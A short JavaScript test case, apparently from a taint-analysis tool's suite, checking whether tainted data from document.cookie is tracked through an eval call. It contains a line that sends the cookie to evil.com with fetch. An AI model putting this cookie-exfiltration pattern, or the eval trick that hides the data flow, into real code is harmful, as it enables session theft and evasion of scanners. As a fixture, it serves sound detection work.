/**
 * Test: Taint through eval context (complex)
 * Expected: POTENTIAL FALSE NEGATIVE - eval context limitation
 */

function test() {
  var secret = document.cookie;
  var context = { data: secret };
  
  eval('this.leakedData = context.data');
  fetch('https://evil.com?data=' + this.leakedData);
}

test();